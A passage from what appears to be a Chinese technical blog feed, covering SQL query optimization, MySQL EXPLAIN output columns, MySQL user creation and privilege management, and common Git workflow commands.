<td>如需要生成一个空表结构：<br>select col1,col2 into #t from t where 1=0<br>这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：<br>create table #t(…)</td>
</tr>
<tr>
<td>对大量重复的数据列建索引无太大意义</td>
<td>并不是所有索引对查询都有效<br>SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时，SQL查询可能不会去利用索引<br>如一表中有字段 sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用。<br></td>
</tr>
<tr>
<td>使用索引会提高select的效率，降低insert 及 update 的效率</td>
<td>索引并不是越多越好，索引固然可以提高相应的 select 的效率，<br>但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引<br></td>
</tr>
<tr>
<td>尽可能的使用 varchar/nvarchar 代替 char/nchar</td>
<td>因为首先变长字段存储空间小，可以节省存储空间，<br>其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。</td>
</tr>
<tr>
<td>应尽可能的避免更新 clustered 索引数据列</td>
<td>因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。</td>
</tr>
</tbody>
</table>
<h1>Explain关键字</h1>
<p>​		explain显示了MySQL如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。简单讲，它的作用就是分析查询性能。</p>
<p>​		explain关键字的使用方法很简单，就是把它放在select查询语句的前面。</p>
<p>​		mysql查看是否使用索引，简单的看type类型就可以。如果它是all，那说明这条查询语句遍历了所有的行，并没有使用到索引。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">explain</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> company_info <span class="token keyword">where</span> cname <span class="token operator">like</span> <span class="token string">'%小%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211201013210968.png" alt="image-20211201013210968"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">explain</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> company_info <span class="token keyword">where</span> cname <span class="token operator">like</span> <span class="token string">'小%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211201013229904.png" alt="image-20211201013229904"></p>
<p>Explain查询结果说明</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211201013654229.png" alt="image-20211201013654229"></p>
<ol>
<li>
<p>id列数字越大越先执行，如果说数字一样大，那么就从上往下依次执行，id列为null的就表是这是一个结果集，不需要使用它来进行查询。</p>
</li>
<li>
<p>select_type列常见的有</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>simple</td>
<td>表示不需要union操作或者不包含子查询的简单select查询。有连接查询时，外层的查询为simple，且只有一个</td>
</tr>
<tr>
<td>primary</td>
<td>一个需要union操作或者含有子查询的select，位于最外层的单位查询的select_type即为primary。且只有一个</td>
</tr>
<tr>
<td>union</td>
<td>union连接的两个select查询，第一个查询是dervied派生表，除了第一个表外，第二个以后的表select_type都是union</td>
</tr>
<tr>
<td>dependent union</td>
<td>与union一样，出现在union 或union all语句中，但是这个查询要受到外部查询的影响</td>
</tr>
<tr>
<td>union result</td>
<td>包含union的结果集，在union和union all语句中,因为它不需要参与查询，所以id字段为null</td>
</tr>
<tr>
<td>subquery</td>
<td>除了from字句中包含的子查询外，其他地方出现的子查询都可能是subquery</td>
</tr>
<tr>
<td>dependent subquery</td>
<td>与dependent union类似，表示这个subquery的查询要受到外部表查询的影响</td>
</tr>
<tr>
<td>derived</td>
<td>from字句中出现的子查询，也叫做派生表，其他数据库中可能叫做内联视图或嵌套select</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>table</p>
<ul>
<li>
<p>如果查询使用了别名，那么这里显示的是别名</p>
</li>
<li>
<p>如果不涉及对数据表的操作，那么这显示为null，</p>
</li>
<li>
<p>如果显示为尖括号括起来的<derived n="">就表示这个是临时表，后边的N就是执行计划中的id，表示结果来自于这个查询产生。</derived></p>
</li>
<li>
<p>如果是尖括号括起来的&lt;union M,N&gt;，与<derived n="">类似，也是一个临时表，表示这个结果来自于union查询的id为M,N的结果集。</derived></p>
</li>
</ul>
</li>
<li>
<p>type</p>
<p>依次从好到差：<font color="red">system，const，eq_ref，ref，fulltext，ref_or_null，unique_subquery，index_subquery，range，index_merge，index，ALL</font>，</p>
<p>除了all之外，其他的type都可以使用到索引，除了index_merge之外，其他的type只可以用到一个索引</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>system</td>
<td>表中只有一行数据或者是空表，且只能用于myisam和memory表。如果是Innodb引擎表，type列在这个情况通常都是all或者index</td>
</tr>
<tr>
<td>const</td>
<td>使用唯一索引或者主键，返回记录一定是1行记录的等值where条件时，通常type是const。其他数据库也叫做唯一索引扫描</td>
</tr>
<tr>
<td>eq_ref</td>
<td>出现在要连接过个表的查询计划中，驱动表只返回一行数据，且这行数据是第二个表的主键或者唯一索引，且必须为not  null，唯一索引和主键是多列时，只有所有的列都用作比较时才会出现eq_ref</td>
</tr>
<tr>
<td>ref</td>
<td>不像eq_ref那样要求连接顺序，也没有主键和唯一索引的要求，只要使用相等条件检索时就可能出现，常见与辅助索引的等值查找。或者多列主键、唯一索引中，使用第一个列之外的列作为等值查找也会出现，总之，返回数据不唯一的等值查找就可能出现。</td>
</tr>
<tr>
<td>fulltext</td>
<td>全文索引检索，要注意，全文索引的优先级很高，若全文索引和普通索引同时存在时，mysql不管代价，优先选择使用全文索引</td>
</tr>
<tr>
<td>ref_or_null</td>
<td>与ref方法类似，只是增加了null值的比较。实际用的不多。</td>
</tr>
<tr>
<td>unique_subquery</td>
<td>用于where中的in形式子查询，子查询返回不重复值唯一值</td>
</tr>
<tr>
<td>index_subquery</td>
<td>用于in形式子查询使用到了辅助索引或者in常数列表，子查询可能返回重复值，可以使用索引将子查询去重。</td>
</tr>
<tr>
<td>range</td>
<td>索引范围扫描，常见于使用&gt;,&lt;,is null,between ,in ,like等运算符的查询中。</td>
</tr>
<tr>
<td>index_merge</td>
<td>表示查询使用了两个以上的索引，最后取交集或者并集，常见and  ，or的条件使用了不同的索引，官方排序这个在ref_or_null之后，但是实际上由于要读取所个索引，性能可能大部分时间都不如range</td>
</tr>
<tr>
<td>index</td>
<td>索引全表扫描，把索引从头到尾扫一遍，常见于使用索引列就可以处理不需要读取数据文件的查询、可以使用索引排序或者分组的查询。</td>
</tr>
<tr>
<td>all</td>
<td>这个就是全表扫描数据文件，然后再在server层进行过滤返回符合要求的记录。</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>possible_keys<br>
查询可能使用到的索引都会在这里列出来</p>
</li>
<li>
<p>key<br>
查询真正使用到的索引，select_type为index_merge时，这里可能出现两个以上的索引，其他的select_type这里只会出现一个。</p>
</li>
<li>
<p>key_len</p>
<p>用于处理查询的索引长度，如果是单列索引，那就整个索引长度算进去，如果是多列索引，那么查询不一定都能使用到所有的列，具体使用到了多少个列的索引，这里就会计算进去，没有使用到的列，这里不会计算进去。留意下这个列的值，算一下你的多列索引总长度就知道有没有使用到所有的列了。要注意，mysql的ICP特性使用到的索引不会计入其中。另外，key_len只计算where条件用到的索引长度，而排序和分组就算用到了索引，也不会计算到key_len中。</p>
</li>
<li>
<p>ref<br>
如果是使用的常数等值查询，这里会显示const，如果是连接查询，被驱动表的执行计划这里会显示驱动表的关联字段，如果是条件使用了表达式或者函数，或者条件列发生了内部隐式转换，这里可能显示为func</p>
</li>
<li>
<p>rows<br>
这里是执行计划中估算的扫描行数，不是精确值</p>
</li>
<li>
<p>extra</p>
</li>
</ol>
<p>​	性能从好到坏:useing index&gt;usinh where &gt; using temporary &gt; using filesort</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>distinct</td>
<td>在select部分使用了distinc关键字</td>
</tr>
<tr>
<td>no tables used</td>
<td>不带from字句的查询或者From dual查询。 使用not in()形式子查询或not  exists运算符的连接查询，这种叫做反连接。<br>即，一般连接查询是先查询内表，再查询外表，反连接就是先查询外表，再查询内表</td>
</tr>
<tr>
<td>using filesort</td>
<td>排序时无法使用到索引时，就会出现这个。<br>常见于order by和group by语句中</td>
</tr>
<tr>
<td>using index</td>
<td>查询时不需要回表查询，直接通过索引就可以获取查询的数据</td>
</tr>
<tr>
<td>using_union</td>
<td>表示使用or连接各个使用索引的条件时，该信息表示从处理结果获取并集</td>
</tr>
<tr>
<td>using intersect</td>
<td>表示使用and的各个索引的条件时，该信息表示是从处理结果获取交集</td>
</tr>
<tr>
<td>using sort_union和using  sort_intersection</td>
<td>与前面两个对应的类似，只是他们是出现在用and和or查询信息量大时，先查询主键，然后进行排序合并后，才能读取记录并返回</td>
</tr>
<tr>
<td>using where</td>
<td>表示存储引擎返回的记录并不是所有的都满足查询条件，需要在server层进行过滤。<br>查询条件中分为限制条件和检查条件，<br>5.6之前，存储引擎只能根据限制条件扫描数据并返回，然后server层根据检查条件进行过滤再返回真正符合查询的数据。<br>5.6.x之后支持ICP特性，可以把检查条件也下推到存储引擎层，不符合检查条件和限制条件的数据，直接不读取，这样就大大减少了存储引擎扫描的记录数量。<br>extra列显示using  index condition</td>
</tr>
<tr>
<td>using temporary</td>
<td>表示使用了临时表存储中间结果。<br>临时表可以是内存临时表和磁盘临时表，执行计划中看不出来，需要查看status变量，used_tmp_table，used_tmp_disk_table才能看出来</td>
</tr>
<tr>
<td>firstmatch(tb_name)</td>
<td>5.6.x开始引入的优化子查询的新特性之一，常见于where字句含有in()类型的子查询。如果内表的数据量比较大，就可能出现这个</td>
</tr>
<tr>
<td>loosescan(m…n)</td>
<td>5.6.x之后引入的优化子查询的新特性之一，在in()类型的子查询中，子查询返回的可能有重复记录时，就可能出现这个</td>
</tr>
<tr>
<td>filtered</td>
<td>使用explain extended时会出现这个列，<br>5.7之后的版本默认就有这个字段，不需要使用explain  extended了。<br>这个字段表示存储引擎返回的数据在server层过滤后，剩下多少满足查询的记录数量的比例，注意是百分比，不是具体记录数</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL用户管理</title>
    <url>/20221031/ad072d5f.html</url>
    <content><![CDATA[<h1>MySQL 创建用户并授权</h1>
<h2 id="一、创建用户">一、创建用户:</h2>
<p>命令:</p>
<p><strong>CREATE USER ‘username’@‘host’ IDENTIFIED BY ‘password’;</strong></p>
<p>说明:</p>
<p>username - 你将创建的用户名,</p>
<p>host - 指定该用户在哪个主机上可以登陆,如果是本地用户可用localhost, 如果想让该用户可以从任意远程主机登陆,可以使用通配符%.</p>
<p>password - 该用户的登陆密码,密码可以为空,如果为空则该用户可以不需要密码登陆服务器.</p>
<p>例子:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'dog'</span><span class="token variable">@'localhost'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'123456'</span><span class="token punctuation">;</span> 

<span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'pig'</span><span class="token variable">@'192.168.1.101_'</span> IDENDIFIED <span class="token keyword">BY</span> <span class="token string">'123456'</span><span class="token punctuation">;</span> 

<span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'123456'</span><span class="token punctuation">;</span> 

<span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">''</span><span class="token punctuation">;</span> 

<span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="二、授权">二、授权:</h2>
<p>命令:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GRANT</span> <span class="token keyword">privileges</span> <span class="token keyword">ON</span> databasename<span class="token punctuation">.</span>tablename <span class="token keyword">TO</span> <span class="token string">'username'</span><span class="token variable">@'host'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>说明:</p>
<p>privileges - 用户的操作权限,如SELECT , INSERT , UPDATE 等(详细列表见该文最后面).如果要授予所的权限则使用ALL.;</p>
<p>databasename - 数据库名,</p>
<p>tablename-表名, 如果要授予该用户对所有数据库和表的相应操作权限则可用<em>表示, 如</em>.*.</p>
<p>例子:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GRANT</span> <span class="token keyword">SELECT</span><span class="token punctuation">,</span> <span class="token keyword">INSERT</span> <span class="token keyword">ON</span> test<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">TO</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span> 

<span class="token keyword">GRANT</span> <span class="token keyword">ALL</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span> 
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>注意:用以上命令授权的用户不能给其它用户授权,</p>
<p>如果想让该用户可以授权,用以下命令:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GRANT</span> <span class="token keyword">privileges</span> <span class="token keyword">ON</span> databasename<span class="token punctuation">.</span>tablename <span class="token keyword">TO</span> <span class="token string">'username'</span><span class="token variable">@'host'</span> <span class="token keyword">WITH</span> <span class="token keyword">GRANT</span> <span class="token keyword">OPTION</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="三、-设置与更改用户密码">三、 设置与更改用户密码</h2>
<p>命令:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> PASSWORD <span class="token keyword">FOR</span> <span class="token string">'username'</span><span class="token variable">@'host'</span> <span class="token operator">=</span> PASSWORD<span class="token punctuation">(</span><span class="token string">'newpassword'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果是当前登陆用户用</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> PASSWORD <span class="token operator">=</span> PASSWORD<span class="token punctuation">(</span><span class="token string">"newpassword"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>非当前用户</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> PASSWORD <span class="token keyword">FOR</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span> <span class="token operator">=</span> PASSWORD<span class="token punctuation">(</span><span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="四、撤销用户权限">四、撤销用户权限</h2>
<p>命令:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">REVOKE</span> privilege <span class="token keyword">ON</span> databasename<span class="token punctuation">.</span>tablename <span class="token keyword">FROM</span> <span class="token string">'username'</span><span class="token variable">@'host'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>说明: privilege, databasename, tablename - 同授权部分.</p>
<p>例子:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">REVOKE</span> <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span> 

注意: 假如你在给用户<span class="token string">'pig'</span><span class="token variable">@'%'</span>授权的时候是这样的<span class="token punctuation">(</span>或类似的<span class="token punctuation">)</span>:

<span class="token keyword">GRANT</span> <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> test<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">TO</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span><span class="token punctuation">,</span>

则在使用<span class="token keyword">REVOKE</span> <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>

命令并不能撤销该用户对test数据库中<span class="token keyword">user</span>表的<span class="token keyword">SELECT</span> 操作<span class="token punctuation">.</span>

相反<span class="token punctuation">,</span>如果授权使用的是<span class="token keyword">GRANT</span> <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>

则<span class="token keyword">REVOKE</span> <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> test<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">FROM</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>

命令也不能撤销该用户对test数据库中<span class="token keyword">user</span>表的<span class="token keyword">Select</span> 权限<span class="token punctuation">.</span> 

具体信息可以用命令<span class="token keyword">SHOW</span> GRANTS <span class="token keyword">FOR</span> <span class="token string">'pig'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span> 查看<span class="token punctuation">.</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="五、删除用户">五、删除用户</h2>
<p>命令:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">USER</span> <span class="token string">'username'</span><span class="token variable">@'host'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>附表:在MySQL中的操作权限</p>
<table>
<thead>
<tr>
<th>ALTER</th>
<th>Allows use  of ALTER TABLE.</th>
</tr>
</thead>
<tbody>
<tr>
<td>ALTER ROUTINE</td>
<td>Alters or drops  stored routines.</td>
</tr>
<tr>
<td>CREATE</td>
<td>Allows use  of CREATE TABLE.</td>
</tr>
<tr>
<td>CREATE ROUTINE</td>
<td>Creates stored  routines.</td>
</tr>
<tr>
<td>CREATE TEMPORARY  TABLE</td>
<td>Allows use  of CREATE TEMPORARY TABLE.</td>
</tr>
<tr>
<td>CREATE USER</td>
<td>Allows use  of CREATE USER, DROP USER, RENAME USER, and REVOKE ALL PRIVILEGES.</td>
</tr>
<tr>
<td>CREATE VIEW</td>
<td>Allows use  of CREATE VIEW.</td>
</tr>
<tr>
<td>DELETE</td>
<td>Allows use  of DELETE.</td>
</tr>
<tr>
<td>DROP</td>
<td>Allows use  of DROP TABLE.</td>
</tr>
<tr>
<td>EXECUTE</td>
<td>Allows the user  to run stored routines.</td>
</tr>
<tr>
<td>FILE</td>
<td>Allows use  of SELECT… INTO OUTFILE and LOAD DATA INFILE.</td>
</tr>
<tr>
<td>INDEX</td>
<td>Allows use  of CREATE INDEX and DROP INDEX.</td>
</tr>
<tr>
<td>INSERT</td>
<td>Allows use  of INSERT.</td>
</tr>
<tr>
<td>LOCK TABLES</td>
<td>Allows use  of LOCK TABLES on tables for which the user also  has SELECT privileges.</td>
</tr>
<tr>
<td>PROCESS</td>
<td>Allows use  of SHOW FULL PROCESSLIST.</td>
</tr>
<tr>
<td>RELOAD</td>
<td>Allows use  of FLUSH.</td>
</tr>
<tr>
<td>REPLICATION</td>
<td>Allows the user  to ask where slave or master</td>
</tr>
<tr>
<td>CLIENT</td>
<td>servers are.</td>
</tr>
<tr>
<td>REPLICATION  SLAVE</td>
<td>Needed for  replication slaves.</td>
</tr>
<tr>
<td>SELECT</td>
<td>Allows use  of SELECT.</td>
</tr>
<tr>
<td>SHOW DATABASES</td>
<td>Allows use  of SHOW DATABASES.</td>
</tr>
<tr>
<td>SHOW VIEW</td>
<td>Allows use  of SHOW CREATE VIEW.</td>
</tr>
<tr>
<td>SHUTDOWN</td>
<td>Allows use  of mysqladmin shutdown.</td>
</tr>
<tr>
<td>SUPER</td>
<td>Allows use  of CHANGE MASTER, KILL, PURGE MASTER LOGS, and SET  GLOBAL SQL statements. Allows mysqladmin debug command. Allows  one extra connection to be made if maximum connections are reached.</td>
</tr>
<tr>
<td>UPDATE</td>
<td>Allows use  of UPDATE.</td>
</tr>
<tr>
<td>USAGE</td>
<td>Allows connection  without any specific privileges.</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Git</title>
    <url>/20221026/69c3279c.html</url>
    <content><![CDATA[<h1>场景命令</h1>
<h2 id="一、切换分支临时处理之后恢复">一、切换分支临时处理之后恢复</h2>
<p>经常有这样的事情发生，当你正在进行项目中某一部分的工作，里面的东西处于一个比较杂乱的状态，而你想转到其他分支上进行一些工作。问题是，你不想提交进行了一半的工作。解决这个问题的办法就是<code>git stash</code>命令。</p>
<p>现在你在分值aaa，已经做了一些修改，现在想要分支bbb做一些事情，但又不想提交aaa上的一些修改：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 保存分支aaa的工作状态</span>
<span class="token function">git</span> stash

<span class="token comment"># 切换到分支bbb</span>
<span class="token function">git</span> checkout bbb

<span class="token comment"># 在分支bbb上做一些操作后，返回分支aaa</span>
<span class="token function">git</span> checkout aaa

<span class="token comment"># 恢复之前的工作状态</span>
<span class="token function">git</span> stash apply 或者 <span class="token function">git</span> stash pop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="二、处理-Git-忘记切分支修改了代码的情况">二、处理 Git 忘记切分支修改了代码的情况</h2>
<p>有时候没注意分支，直接在 master 上做开发了，假设你现在在 master 分支上已经修改了文件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 把当前未提交到本地（和服务器）的代码推入到 Git 的栈中：</span>
$ <span class="token function">git</span> stash

<span class="token comment"># 查看效果：</span>
$ <span class="token function">git</span> status 

<span class="token comment"># 切换分支：</span>
$ <span class="token function">git</span> branch dev 

<span class="token comment"># 还原代码：</span>
$ <span class="token function">git</span> stash apply<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="三、本地新建分支后，同步到远程不存在的分支">三、本地新建分支后，同步到远程不存在的分支</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> push local-branch-name:remote-branch-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="四、撤销某次commit">四、撤销某次commit</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 先找到commit id</span>
$ <span class="token function">git</span> log

<span class="token comment"># 撤销</span>
$ <span class="token function">git</span> reset <span class="token parameter variable">--hard</span> commit_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="五、重命名分支">五、重命名分支</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>、本地分支重命名
 <span class="token function">git</span> branch <span class="token parameter variable">-m</span> oldName  newName
 
<span class="token number">2</span>、将重命名后的分支推送到远程
<span class="token function">git</span> push origin newName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="六、分支覆盖">六、分支覆盖</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout pre-release
<span class="token function">git</span> reset <span class="token parameter variable">--hard</span> origin/develop
<span class="token function">git</span> push <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="七、查看日志">七、查看日志</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log <span class="token parameter variable">--graph</span> <span class="token parameter variable">--pretty</span><span class="token operator">=</span>oneline --abbrev-commit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="八、合并多个commit为另外的总commit">八、合并多个commit为另外的总commit</h2>
<pre class="line-numbers language-none"><code class="language-none">参考：https://backlog.com/git-tutorial/cn/stepup/stepup7_5.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>当前分支：分支1<br>
待合并分支：分支2</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> checkout <span class="token parameter variable">-b</span> 分支2 origin/分支2
$ <span class="token function">git</span> checkout 分支1
$ <span class="token function">git</span> merge <span class="token parameter variable">--squash</span> 分支2
$ <span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">'PDF fix1'</span>
$ <span class="token function">git</span> push origin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>实际应用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> fetch origin <span class="token parameter variable">-p</span>
<span class="token function">git</span> pull
<span class="token function">git</span> branch <span class="token parameter variable">-m</span>  feature-11111 feature-11111-1
<span class="token function">git</span> push origin <span class="token parameter variable">--delete</span> feature-11111
<span class="token function">git</span> checkout <span class="token parameter variable">-b</span> dev origin/dev
<span class="token function">git</span> branch <span class="token parameter variable">-m</span> dev feature-11111
<span class="token function">git</span> checkout feature-11111
<span class="token function">git</span> push origin feature-11111
<span class="token function">git</span> branch <span class="token parameter variable">-m</span> feature-11111 <span class="token function">dd</span>
<span class="token function">git</span> checkout <span class="token parameter variable">-b</span> feature-11111 origin/feature-11111
<span class="token function">git</span> branch <span class="token parameter variable">-D</span> <span class="token function">dd</span>

<span class="token function">git</span> merge <span class="token parameter variable">--squash</span> feature-11111-1

<span class="token function">git</span> commit <span class="token parameter variable">-m</span> 简介
<span class="token function">git</span> push origin feature-11111
<span class="token function">git</span> branch <span class="token parameter variable">-D</span> feature-11111-1
<span class="token function">git</span> branch <span class="token parameter variable">-m</span> feature-11111 <span class="token function">dd</span>
<span class="token function">git</span> checkout <span class="token parameter variable">-b</span> feature-11111 origin/feature-11111
<span class="token function">git</span> branch <span class="token parameter variable">-D</span> <span class="token function">dd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="九、解决git文件名大小写无法修改的问题">九、解决git文件名大小写无法修改的问题</h2>
<pre class="line-numbers language-none"><code class="language-none">git默认配置为忽略大小写，因此无法正确检测大小写的更改

运行：
git config core.ignorecase false

关闭git忽略大小写配置，即可检测到大小写名称更改<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="十、如何快速关联-修改-Git-远程仓库地址">十、如何快速关联/ 修改 Git 远程仓库地址</h2>
<h1>常用命令</h1>
<h2 id="一、流程图示">一、流程图示</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/f96b3444-14a7-4793-a4a5-a0bd3d52b576.png" alt="img"></p>
<p>Git中几个专用名词的译名如下：</p>
<pre class="line-numbers language-none"><code class="language-none">Workspace：工作区
Index / Stage：暂存区
Repository：仓库区（或本地仓库）
Remote：远程仓库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="二、新建代码库">二、新建代码库</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在当前目录新建一个Git代码库</span>
$ <span class="token function">git</span> init

<span class="token comment"># 新建一个目录，将其初始化为Git代码库</span>
$ <span class="token function">git</span> init <span class="token punctuation">[</span>project-name<span class="token punctuation">]</span>

<span class="token comment"># 下载一个项目和它的整个代码历史</span>
$ <span class="token function">git</span> clone <span class="token punctuation">[</span>url<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="三、配置">三、配置</h2>
<p>Git的设置文件为<code>.gitconfig</code>，Git的配置分为两种：</p>
<ul>
<li>全局配置：在用户主目录下</li>
<li>在项目目录下</li>
</ul>
<p>注意：在当前项目下面查看的配置（<code>git config --list</code>）是全局配置 + 当前项目的配置，使用的时候会优先使用当前项目的配置；</p>
<p>一般公司项目都是在GitLab上的，所以可以在项目根目录进行单独配置，不用全局设置，以免影响其他远程仓库如GitHub的使用。</p>
